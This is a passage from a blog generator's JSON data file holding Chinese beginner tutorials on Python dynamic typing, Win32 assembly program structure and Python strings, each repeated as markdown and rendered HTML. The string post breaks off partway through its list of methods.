用来测试两个引用的值是否相等。（比较表面值）\n- is 用来测试两个引用是否为同一对象。（比较内存地址）\n\n**引用与拷贝**\n\n- 引用是指针\n- 拷贝是生成新对象。\n\n赋值生成引用，而非拷贝。\n\n**True/False**\n\nPython把非0数字和非空数据结构视为真，0和空数据结构视为假。","source":"_posts/00python基础学习系列之动态类型.md","raw":"---\ntitle: Python基础学习系列Chapter 1：动态类型\ndate: 2019-03-18 16:24:35\ntags: \n\t- Python基础\n\t- Language\ncategories:\n\t- Python\n---\n\n### 可变类型与不可变类型\n\nPython的对象都可分为可变性对象和不可变性对象。\n\n可变性：可以原处修改。即修改这个对象。\n\n> \tlist = [1,2,3]     #这是一个列表对象list\n> \tlist[0]=0          #此时list内容变成了[0,2,3]，但还是之前的列表对象list。\n\n不可变性：不可原处修改。即不能修改该对象，换句话说，修改了，那就不是原来的那个对象了。\n\n<!-- more -->\n\n核心对象：\n\n> **可变对象**：列表、字典、集合。\n>\n> **不可变对象**：数字、字符串、元组。\t\n\n### 动态类型\n\n**对象拥有两个头部信息**：\n\n类型标识符：标识对象的类型。(type)\n\n引用计数器：记录对象被引用的次数。\n\n> 因此类型是属于对象的，而不是变量，对象的头部信息指明了对象类型，因此不用声明变量的类型。\n\n**变量、对象、引用**\n\n变量和对象实质是不同的两部分内存空间。\n\n变量是在进行赋值操作时创建的。\n\n引用：可看做是一个指针。\n\n赋值的实质：变量引用了对象，即变量通过指针指向对象的内存地址空间。\n\n> 例：a=1      #变量a引用了对象1，a拥有指向对象1的内存地址的指针。\n\n**共享引用**\n\n对象可以被多个变量引用，反过来说一个变量只是对象的一个引用而已。\n\n> 例：a=1;b=a  #b会引用a引用的对象，即b会指向a所指向的内存空间，a,b共享引用了对象1。\n\n**共享引用和原处修改**\n\n对于共享引用了可原处修改的对象要注意，因为修改可原处修改的对象会导致所有的共享引用改变。\n\n> \t例： \n> \t\t\tL1=[1,2,3]\n> \t\t\tL2=L1\n> \t\t\tL2[0]=0\n> \t\t\n>\n> \t\t上面的操作会改变L1,因为L1、L2共享引用了同一个列表对象，而列表对象是可变对象，因此列表可以原处修改。\n\n**垃圾回收机制**\n\n对象每被引用一次，对象头部的引用计数器会+1。\n当对象头部的引用计数为0时，对象将被回收。\n\n缓存机制：Python会缓存复用一些小的整数或小的字符串，为了加快速度。导致某些对象不会立即回收或多个变量。\n\n**is与==**\n\n- == 用来测试两个引用的值是否相等。（比较表面值）\n- is 用来测试两个引用是否为同一对象。（比较内存地址）\n\n**引用与拷贝**\n\n- 引用是指针\n- 拷贝是生成新对象。\n\n赋值生成引用，而非拷贝。\n\n**True/False**\n\nPython把非0数字和非空数据结构视为真，0和空数据结构视为假。","slug":"00python基础学习系列之动态类型","published":1,"updated":"2019-03-29T07:21:40.645Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83il00027or0uraqlcta","content":"<h3 id=\"可变类型与不可变类型\"><a href=\"#可变类型与不可变类型\" class=\"headerlink\" title=\"可变类型与不可变类型\"></a>可变类型与不可变类型</h3><p>Python的对象都可分为可变性对象和不可变性对象。</p>\n<p>可变性：可以原处修改。即修改这个对象。</p>\n<blockquote>\n<pre><code>list = [1,2,3]     #这是一个列表对象list\nlist[0]=0          #此时list内容变成了[0,2,3]，但还是之前的列表对象list。\n</code></pre></blockquote>\n<p>不可变性：不可原处修改。即不能修改该对象，换句话说，修改了，那就不是原来的那个对象了。</p>\n<a id=\"more\"></a>\n<p>核心对象：</p>\n<blockquote>\n<p><strong>可变对象</strong>：列表、字典、集合。</p>\n<p><strong>不可变对象</strong>：数字、字符串、元组。    </p>\n</blockquote>\n<h3 id=\"动态类型\"><a href=\"#动态类型\" class=\"headerlink\" title=\"动态类型\"></a>动态类型</h3><p><strong>对象拥有两个头部信息</strong>：</p>\n<p>类型标识符：标识对象的类型。(type)</p>\n<p>引用计数器：记录对象被引用的次数。</p>\n<blockquote>\n<p>因此类型是属于对象的，而不是变量，对象的头部信息指明了对象类型，因此不用声明变量的类型。</p>\n</blockquote>\n<p><strong>变量、对象、引用</strong></p>\n<p>变量和对象实质是不同的两部分内存空间。</p>\n<p>变量是在进行赋值操作时创建的。</p>\n<p>引用：可看做是一个指针。</p>\n<p>赋值的实质：变量引用了对象，即变量通过指针指向对象的内存地址空间。</p>\n<blockquote>\n<p>例：a=1      #变量a引用了对象1，a拥有指向对象1的内存地址的指针。</p>\n</blockquote>\n<p><strong>共享引用</strong></p>\n<p>对象可以被多个变量引用，反过来说一个变量只是对象的一个引用而已。</p>\n<blockquote>\n<p>例：a=1;b=a  #b会引用a引用的对象，即b会指向a所指向的内存空间，a,b共享引用了对象1。</p>\n</blockquote>\n<p><strong>共享引用和原处修改</strong></p>\n<p>对于共享引用了可原处修改的对象要注意，因为修改可原处修改的对象会导致所有的共享引用改变。</p>\n<blockquote>\n<pre><code>例： \n        L1=[1,2,3]\n        L2=L1\n        L2[0]=0\n\n\n    上面的操作会改变L1,因为L1、L2共享引用了同一个列表对象，而列表对象是可变对象，因此列表可以原处修改。\n</code></pre></blockquote>\n<p><strong>垃圾回收机制</strong></p>\n<p>对象每被引用一次，对象头部的引用计数器会+1。<br>当对象头部的引用计数为0时，对象将被回收。</p>\n<p>缓存机制：Python会缓存复用一些小的整数或小的字符串，为了加快速度。导致某些对象不会立即回收或多个变量。</p>\n<p><strong>is与==</strong></p>\n<ul>\n<li>== 用来测试两个引用的值是否相等。（比较表面值）</li>\n<li>is 用来测试两个引用是否为同一对象。（比较内存地址）</li>\n</ul>\n<p><strong>引用与拷贝</strong></p>\n<ul>\n<li>引用是指针</li>\n<li>拷贝是生成新对象。</li>\n</ul>\n<p>赋值生成引用，而非拷贝。</p>\n<p><strong>True/False</strong></p>\n<p>Python把非0数字和非空数据结构视为真，0和空数据结构视为假。</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"可变类型与不可变类型\"><a href=\"#可变类型与不可变类型\" class=\"headerlink\" title=\"可变类型与不可变类型\"></a>可变类型与不可变类型</h3><p>Python的对象都可分为可变性对象和不可变性对象。</p>\n<p>可变性：可以原处修改。即修改这个对象。</p>\n<blockquote>\n<pre><code>list = [1,2,3]     #这是一个列表对象list\nlist[0]=0          #此时list内容变成了[0,2,3]，但还是之前的列表对象list。\n</code></pre></blockquote>\n<p>不可变性：不可原处修改。即不能修改该对象，换句话说，修改了，那就不是原来的那个对象了。</p>","more":"<p>核心对象：</p>\n<blockquote>\n<p><strong>可变对象</strong>：列表、字典、集合。</p>\n<p><strong>不可变对象</strong>：数字、字符串、元组。    </p>\n</blockquote>\n<h3 id=\"动态类型\"><a href=\"#动态类型\" class=\"headerlink\" title=\"动态类型\"></a>动态类型</h3><p><strong>对象拥有两个头部信息</strong>：</p>\n<p>类型标识符：标识对象的类型。(type)</p>\n<p>引用计数器：记录对象被引用的次数。</p>\n<blockquote>\n<p>因此类型是属于对象的，而不是变量，对象的头部信息指明了对象类型，因此不用声明变量的类型。</p>\n</blockquote>\n<p><strong>变量、对象、引用</strong></p>\n<p>变量和对象实质是不同的两部分内存空间。</p>\n<p>变量是在进行赋值操作时创建的。</p>\n<p>引用：可看做是一个指针。</p>\n<p>赋值的实质：变量引用了对象，即变量通过指针指向对象的内存地址空间。</p>\n<blockquote>\n<p>例：a=1      #变量a引用了对象1，a拥有指向对象1的内存地址的指针。</p>\n</blockquote>\n<p><strong>共享引用</strong></p>\n<p>对象可以被多个变量引用，反过来说一个变量只是对象的一个引用而已。</p>\n<blockquote>\n<p>例：a=1;b=a  #b会引用a引用的对象，即b会指向a所指向的内存空间，a,b共享引用了对象1。</p>\n</blockquote>\n<p><strong>共享引用和原处修改</strong></p>\n<p>对于共享引用了可原处修改的对象要注意，因为修改可原处修改的对象会导致所有的共享引用改变。</p>\n<blockquote>\n<pre><code>例： \n        L1=[1,2,3]\n        L2=L1\n        L2[0]=0\n\n\n    上面的操作会改变L1,因为L1、L2共享引用了同一个列表对象，而列表对象是可变对象，因此列表可以原处修改。\n</code></pre></blockquote>\n<p><strong>垃圾回收机制</strong></p>\n<p>对象每被引用一次，对象头部的引用计数器会+1。<br>当对象头部的引用计数为0时，对象将被回收。</p>\n<p>缓存机制：Python会缓存复用一些小的整数或小的字符串，为了加快速度。导致某些对象不会立即回收或多个变量。</p>\n<p><strong>is与==</strong></p>\n<ul>\n<li>== 用来测试两个引用的值是否相等。（比较表面值）</li>\n<li>is 用来测试两个引用是否为同一对象。（比较内存地址）</li>\n</ul>\n<p><strong>引用与拷贝</strong></p>\n<ul>\n<li>引用是指针</li>\n<li>拷贝是生成新对象。</li>\n</ul>\n<p>赋值生成引用，而非拷贝。</p>\n<p><strong>True/False</strong></p>\n<p>Python把非0数字和非空数据结构视为真，0和空数据结构视为假。</p>"},{"title":"Win32编程基础Chapter 2：Win32程序结构","date":"2019-04-01T03:07:27.000Z","_content":"\n#### 0x00 Win32程序基本结构：\n\n```assembly\n.386                    \n.model flat, stdcall    \noption  casemap:none   \n\n<一些include语句>\n\n.stack [堆栈段的大小]     \n\n.data                   \n  <Your initialized data>\n        ......\n\n.data?\n  <Your uninitialized data>\n        ......\n\n.const\n  <Your constants>\n        ......\n\n.code\n  <your code>\n    \n<标号>\n  <your code>\n  .....\nend <标号>\n\n```\n\n<!-- more -->\n\n**结构解析**\n\n```\n.386\n```\n\n这是一个汇编语言伪指令，他告诉编译器我们的程序是使用80386指令集编写的。\n\nWin32程序工作在80386及以上的处理器中，所以必须有该语句。\n\n```\n.model flat, stdcall \n```\n\n`.MODEL`是用来指定内存模式的伪指令，在Win32下，只有一种内存模型，那就是FLAT。 \n`stdcall`告诉编译器参数的传递约定为从右到左传递，即右边的参数最先入栈，恢复堆栈的工作交由被调用者。\n\n```\noption  casemap:none\n```\n\n程序中变量和子程序名是否大小写敏感。因为Win32 API是大小写敏感的，避免大小写敏感不一致导致错误。\n\n```\n.stack [堆栈段的大小]\n```\n\nWin32中是不必考虑定义堆栈的，系统会自动分配一个向下扩展的、足够大的段作为栈段。最多只需要定义栈段的大小。\n栈的数据是可读可写且可以被执行的。\n\n```\n.DATA \n.DATA? \n.CONST \n.CODE\n```\n\n它们都是定义段的伪指令，在Win32中实际只有数据和代码之分，前三者定义数据段，`.code`定义代码段。\n\n`.data`包含已初始化的数据，即在程序装入完成时，就存在内存中了。可读可写，不可执行。存放在PE文件的_DATA节区中。\n\n`.data?`包含未初始化的数据，生成可执行文件时只保留大小信息，在程序执行时才开始使用，可节约空间。可读写，不可执                 行。存放在PE文件的_BSS节区。\n\n> 例如，在.data定义一个变量作为缓冲区，大小为5M，那么生成的可执行文件大小是包含这5M的，但如果定义在.data?就不会。\n\n`.const`包含一些在程序执行过程不会改变的常量数据，在程序完成装载时也已经存在，可读不可写，不可执行。尝试对其写入                    将报错。\n\n`.code`定义代码段，所有代码要写于其中，因为所有数据段都是不可执行的，只有代码段具有可执行的属性（栈段也可执行）。\n\n运行在特权3的应用程序，`.code`段是可读不可写的，但不是绝对的，代码段的属性是由PE头部的属性决定的。\n\n`.code`段存放在PE文件的_TEXT节区中。\n\n#### 0x01 程序结束与程序入口\n\n```assembly\n<标号>\n\n...  <code> ...\n\nend <标号>\n```\n\n程序遇到end时，表示程序结束，同时end后面的标号也指明了程序的入口为标号处。**\n\n在多模块编程中，不必每个模块都要写开始标号，只要在主模块使用标号即可，而每个模块也只用end，而不用end <标号>。\n\n#### 0x02 注释与换行\n\nWin32中，分号（；）是注释符。但在字符串定义中的分号不会作为注释符。\n\n```assembly\nszChar db 'Hello;'   ;Hello之后的；不会作为注释符。\n```\n\n当程序一行过长时，可在行尾使用\\进行多行书写，提高可读性。","source":"_posts/01-win32编程基础Chapter-2.md","raw":"---\ntitle: Win32编程基础Chapter 2：Win32程序结构\ndate: 2019-04-01 11:07:27\ntags: \n\t- Win32\n\t- 汇编语言\ncategories: Win32\n---\n\n#### 0x00 Win32程序基本结构：\n\n```assembly\n.386                    \n.model flat, stdcall    \noption  casemap:none   \n\n<一些include语句>\n\n.stack [堆栈段的大小]     \n\n.data                   \n  <Your initialized data>\n        ......\n\n.data?\n  <Your uninitialized data>\n        ......\n\n.const\n  <Your constants>\n        ......\n\n.code\n  <your code>\n    \n<标号>\n  <your code>\n  .....\nend <标号>\n\n```\n\n<!-- more -->\n\n**结构解析**\n\n```\n.386\n```\n\n这是一个汇编语言伪指令，他告诉编译器我们的程序是使用80386指令集编写的。\n\nWin32程序工作在80386及以上的处理器中，所以必须有该语句。\n\n```\n.model flat, stdcall \n```\n\n`.MODEL`是用来指定内存模式的伪指令，在Win32下，只有一种内存模型，那就是FLAT。 \n`stdcall`告诉编译器参数的传递约定为从右到左传递，即右边的参数最先入栈，恢复堆栈的工作交由被调用者。\n\n```\noption  casemap:none\n```\n\n程序中变量和子程序名是否大小写敏感。因为Win32 API是大小写敏感的，避免大小写敏感不一致导致错误。\n\n```\n.stack [堆栈段的大小]\n```\n\nWin32中是不必考虑定义堆栈的，系统会自动分配一个向下扩展的、足够大的段作为栈段。最多只需要定义栈段的大小。\n栈的数据是可读可写且可以被执行的。\n\n```\n.DATA \n.DATA? \n.CONST \n.CODE\n```\n\n它们都是定义段的伪指令，在Win32中实际只有数据和代码之分，前三者定义数据段，`.code`定义代码段。\n\n`.data`包含已初始化的数据，即在程序装入完成时，就存在内存中了。可读可写，不可执行。存放在PE文件的_DATA节区中。\n\n`.data?`包含未初始化的数据，生成可执行文件时只保留大小信息，在程序执行时才开始使用，可节约空间。可读写，不可执                 行。存放在PE文件的_BSS节区。\n\n> 例如，在.data定义一个变量作为缓冲区，大小为5M，那么生成的可执行文件大小是包含这5M的，但如果定义在.data?就不会。\n\n`.const`包含一些在程序执行过程不会改变的常量数据，在程序完成装载时也已经存在，可读不可写，不可执行。尝试对其写入                    将报错。\n\n`.code`定义代码段，所有代码要写于其中，因为所有数据段都是不可执行的，只有代码段具有可执行的属性（栈段也可执行）。\n\n运行在特权3的应用程序，`.code`段是可读不可写的，但不是绝对的，代码段的属性是由PE头部的属性决定的。\n\n`.code`段存放在PE文件的_TEXT节区中。\n\n#### 0x01 程序结束与程序入口\n\n```assembly\n<标号>\n\n...  <code> ...\n\nend <标号>\n```\n\n程序遇到end时，表示程序结束，同时end后面的标号也指明了程序的入口为标号处。**\n\n在多模块编程中，不必每个模块都要写开始标号，只要在主模块使用标号即可，而每个模块也只用end，而不用end <标号>。\n\n#### 0x02 注释与换行\n\nWin32中，分号（；）是注释符。但在字符串定义中的分号不会作为注释符。\n\n```assembly\nszChar db 'Hello;'   ;Hello之后的；不会作为注释符。\n```\n\n当程序一行过长时，可在行尾使用\\进行多行书写，提高可读性。","slug":"01-win32编程基础Chapter-2","published":1,"updated":"2019-04-01T03:58:42.296Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83ir00067or0x6t8823a","content":"<h4 id=\"0x00-Win32程序基本结构：\"><a href=\"#0x00-Win32程序基本结构：\" class=\"headerlink\" title=\"0x00 Win32程序基本结构：\"></a>0x00 Win32程序基本结构：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.386                    </span><br><span class=\"line\">.model flat, stdcall    </span><br><span class=\"line\">option  casemap:none   </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;一些include语句&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">.stack [堆栈段的大小]     </span><br><span class=\"line\"></span><br><span class=\"line\">.data                   </span><br><span class=\"line\">  &lt;Your initialized data&gt;</span><br><span class=\"line\">        ......</span><br><span class=\"line\"></span><br><span class=\"line\">.data?</span><br><span class=\"line\">  &lt;Your uninitialized data&gt;</span><br><span class=\"line\">        ......</span><br><span class=\"line\"></span><br><span class=\"line\">.const</span><br><span class=\"line\">  &lt;Your constants&gt;</span><br><span class=\"line\">        ......</span><br><span class=\"line\"></span><br><span class=\"line\">.code</span><br><span class=\"line\">  &lt;your code&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;标号&gt;</span><br><span class=\"line\">  &lt;your code&gt;</span><br><span class=\"line\">  .....</span><br><span class=\"line\">end &lt;标号&gt;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<p><strong>结构解析</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.386</span><br></pre></td></tr></table></figure>\n<p>这是一个汇编语言伪指令，他告诉编译器我们的程序是使用80386指令集编写的。</p>\n<p>Win32程序工作在80386及以上的处理器中，所以必须有该语句。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.model flat, stdcall</span><br></pre></td></tr></table></figure>\n<p><code>.MODEL</code>是用来指定内存模式的伪指令，在Win32下，只有一种内存模型，那就是FLAT。<br><code>stdcall</code>告诉编译器参数的传递约定为从右到左传递，即右边的参数最先入栈，恢复堆栈的工作交由被调用者。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">option  casemap:none</span><br></pre></td></tr></table></figure>\n<p>程序中变量和子程序名是否大小写敏感。因为Win32 API是大小写敏感的，避免大小写敏感不一致导致错误。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.stack [堆栈段的大小]</span><br></pre></td></tr></table></figure>\n<p>Win32中是不必考虑定义堆栈的，系统会自动分配一个向下扩展的、足够大的段作为栈段。最多只需要定义栈段的大小。<br>栈的数据是可读可写且可以被执行的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.DATA </span><br><span class=\"line\">.DATA? </span><br><span class=\"line\">.CONST </span><br><span class=\"line\">.CODE</span><br></pre></td></tr></table></figure>\n<p>它们都是定义段的伪指令，在Win32中实际只有数据和代码之分，前三者定义数据段，<code>.code</code>定义代码段。</p>\n<p><code>.data</code>包含已初始化的数据，即在程序装入完成时，就存在内存中了。可读可写，不可执行。存放在PE文件的_DATA节区中。</p>\n<p><code>.data?</code>包含未初始化的数据，生成可执行文件时只保留大小信息，在程序执行时才开始使用，可节约空间。可读写，不可执                 行。存放在PE文件的_BSS节区。</p>\n<blockquote>\n<p>例如，在.data定义一个变量作为缓冲区，大小为5M，那么生成的可执行文件大小是包含这5M的，但如果定义在.data?就不会。</p>\n</blockquote>\n<p><code>.const</code>包含一些在程序执行过程不会改变的常量数据，在程序完成装载时也已经存在，可读不可写，不可执行。尝试对其写入                    将报错。</p>\n<p><code>.code</code>定义代码段，所有代码要写于其中，因为所有数据段都是不可执行的，只有代码段具有可执行的属性（栈段也可执行）。</p>\n<p>运行在特权3的应用程序，<code>.code</code>段是可读不可写的，但不是绝对的，代码段的属性是由PE头部的属性决定的。</p>\n<p><code>.code</code>段存放在PE文件的_TEXT节区中。</p>\n<h4 id=\"0x01-程序结束与程序入口\"><a href=\"#0x01-程序结束与程序入口\" class=\"headerlink\" title=\"0x01 程序结束与程序入口\"></a>0x01 程序结束与程序入口</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;标号&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">...  &lt;code&gt; ...</span><br><span class=\"line\"></span><br><span class=\"line\">end &lt;标号&gt;</span><br></pre></td></tr></table></figure>\n<p>程序遇到end时，表示程序结束，同时end后面的标号也指明了程序的入口为标号处。**</p>\n<p>在多模块编程中，不必每个模块都要写开始标号，只要在主模块使用标号即可，而每个模块也只用end，而不用end &lt;标号&gt;。</p>\n<h4 id=\"0x02-注释与换行\"><a href=\"#0x02-注释与换行\" class=\"headerlink\" title=\"0x02 注释与换行\"></a>0x02 注释与换行</h4><p>Win32中，分号（；）是注释符。但在字符串定义中的分号不会作为注释符。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">szChar db &apos;Hello;&apos;   ;Hello之后的；不会作为注释符。</span><br></pre></td></tr></table></figure>\n<p>当程序一行过长时，可在行尾使用\\进行多行书写，提高可读性。</p>\n","site":{"data":{}},"excerpt":"<h4 id=\"0x00-Win32程序基本结构：\"><a href=\"#0x00-Win32程序基本结构：\" class=\"headerlink\" title=\"0x00 Win32程序基本结构：\"></a>0x00 Win32程序基本结构：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.386                    </span><br><span class=\"line\">.model flat, stdcall    </span><br><span class=\"line\">option  casemap:none   </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;一些include语句&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">.stack [堆栈段的大小]     </span><br><span class=\"line\"></span><br><span class=\"line\">.data                   </span><br><span class=\"line\">  &lt;Your initialized data&gt;</span><br><span class=\"line\">        ......</span><br><span class=\"line\"></span><br><span class=\"line\">.data?</span><br><span class=\"line\">  &lt;Your uninitialized data&gt;</span><br><span class=\"line\">        ......</span><br><span class=\"line\"></span><br><span class=\"line\">.const</span><br><span class=\"line\">  &lt;Your constants&gt;</span><br><span class=\"line\">        ......</span><br><span class=\"line\"></span><br><span class=\"line\">.code</span><br><span class=\"line\">  &lt;your code&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;标号&gt;</span><br><span class=\"line\">  &lt;your code&gt;</span><br><span class=\"line\">  .....</span><br><span class=\"line\">end &lt;标号&gt;</span><br></pre></td></tr></table></figure>","more":"<p><strong>结构解析</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.386</span><br></pre></td></tr></table></figure>\n<p>这是一个汇编语言伪指令，他告诉编译器我们的程序是使用80386指令集编写的。</p>\n<p>Win32程序工作在80386及以上的处理器中，所以必须有该语句。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.model flat, stdcall</span><br></pre></td></tr></table></figure>\n<p><code>.MODEL</code>是用来指定内存模式的伪指令，在Win32下，只有一种内存模型，那就是FLAT。<br><code>stdcall</code>告诉编译器参数的传递约定为从右到左传递，即右边的参数最先入栈，恢复堆栈的工作交由被调用者。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">option  casemap:none</span><br></pre></td></tr></table></figure>\n<p>程序中变量和子程序名是否大小写敏感。因为Win32 API是大小写敏感的，避免大小写敏感不一致导致错误。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.stack [堆栈段的大小]</span><br></pre></td></tr></table></figure>\n<p>Win32中是不必考虑定义堆栈的，系统会自动分配一个向下扩展的、足够大的段作为栈段。最多只需要定义栈段的大小。<br>栈的数据是可读可写且可以被执行的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.DATA </span><br><span class=\"line\">.DATA? </span><br><span class=\"line\">.CONST </span><br><span class=\"line\">.CODE</span><br></pre></td></tr></table></figure>\n<p>它们都是定义段的伪指令，在Win32中实际只有数据和代码之分，前三者定义数据段，<code>.code</code>定义代码段。</p>\n<p><code>.data</code>包含已初始化的数据，即在程序装入完成时，就存在内存中了。可读可写，不可执行。存放在PE文件的_DATA节区中。</p>\n<p><code>.data?</code>包含未初始化的数据，生成可执行文件时只保留大小信息，在程序执行时才开始使用，可节约空间。可读写，不可执                 行。存放在PE文件的_BSS节区。</p>\n<blockquote>\n<p>例如，在.data定义一个变量作为缓冲区，大小为5M，那么生成的可执行文件大小是包含这5M的，但如果定义在.data?就不会。</p>\n</blockquote>\n<p><code>.const</code>包含一些在程序执行过程不会改变的常量数据，在程序完成装载时也已经存在，可读不可写，不可执行。尝试对其写入                    将报错。</p>\n<p><code>.code</code>定义代码段，所有代码要写于其中，因为所有数据段都是不可执行的，只有代码段具有可执行的属性（栈段也可执行）。</p>\n<p>运行在特权3的应用程序，<code>.code</code>段是可读不可写的，但不是绝对的，代码段的属性是由PE头部的属性决定的。</p>\n<p><code>.code</code>段存放在PE文件的_TEXT节区中。</p>\n<h4 id=\"0x01-程序结束与程序入口\"><a href=\"#0x01-程序结束与程序入口\" class=\"headerlink\" title=\"0x01 程序结束与程序入口\"></a>0x01 程序结束与程序入口</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;标号&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">...  &lt;code&gt; ...</span><br><span class=\"line\"></span><br><span class=\"line\">end &lt;标号&gt;</span><br></pre></td></tr></table></figure>\n<p>程序遇到end时，表示程序结束，同时end后面的标号也指明了程序的入口为标号处。**</p>\n<p>在多模块编程中，不必每个模块都要写开始标号，只要在主模块使用标号即可，而每个模块也只用end，而不用end &lt;标号&gt;。</p>\n<h4 id=\"0x02-注释与换行\"><a href=\"#0x02-注释与换行\" class=\"headerlink\" title=\"0x02 注释与换行\"></a>0x02 注释与换行</h4><p>Win32中，分号（；）是注释符。但在字符串定义中的分号不会作为注释符。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">szChar db &apos;Hello;&apos;   ;Hello之后的；不会作为注释符。</span><br></pre></td></tr></table></figure>\n<p>当程序一行过长时，可在行尾使用\\进行多行书写，提高可读性。</p>"},{"title":"Python基础学习系列Chapter 2：字符串","date":"2019-03-18T08:50:44.000Z","_content":"\n### 0x00 字符串概述\n\n字符串是不可变的序列。\n\nPython3.0字符串分3中类型：str用于Unicode文本；bytes用于二进制文本；bytearray是bytes的变体。\n\n### 0x01 字符串\n\n#### 1.字符串常量：\n\n```python\n'string'\n\"string\"\n'''string'''\n\"\"\"string\"\"\"\nr'string'     #Raw字符串\nb'string'     #bytes字符串\n```\n\n<!-- more -->\n\n#### 2.字符串操作\n\n- 索引：`str[下标]`\n- 切片：`str[下标开始:下标结束：步长]`    #步长默认为1\n- 合并：`+`、`*`\n- 类型强制转换：`str()`\n- 修改字符串：可以通过产生新对象后重新赋值给原变量。\n\n#### 3.字符串格式化：\n\n```python\n\"this is %s\" %'collision'               #字符串形式\n\"%s is %s boy\"%(\"collision\",\"good\")     #元组形式\n\"%(x)d,%(y)d\"%{\"x\":1,\"y\":2}             #字典形式\n```\n\nformat格式化\n\n```python\n'a{}c{}'.format('b','d')\n'a{0}c{1}'.format('b','d')\n'a{name}c{age}'.format(name='b',age='d')\n'a{name}c{age}'.format_map({'name':'b','age'='d'})\n```\n\n### 0x02 字符串方法：\t\n\n```python\n查找：\n\tcount()          #返回字符或字符串在字符串中出现的次数\n\tfind()、rfind()  #查找字符或字符串返回第一次出现时的下标\n\tindex()          #返回字符或字符串在字符串中的下标\t\n\t\n\tPS:find()与index()区别在于，find对不存在的字符串查找会返回-1，而index会报错。\n\n判断：\n\tstartswith()、endswith()     #判断字符或字符串的开始与结尾\n\t\n\tisalpha()        #判断字符串是否是字母组成\t\n\tisnumeric()      #字符串只包含数字字符\t\n\tisalnum()        #判断字符串是否是字母或数字组\n\t\n\tisdecimal()      #判断字符串是否是十进制数字\n\tisdigit()        #判断字符串是否是数字组成\n\tislower()        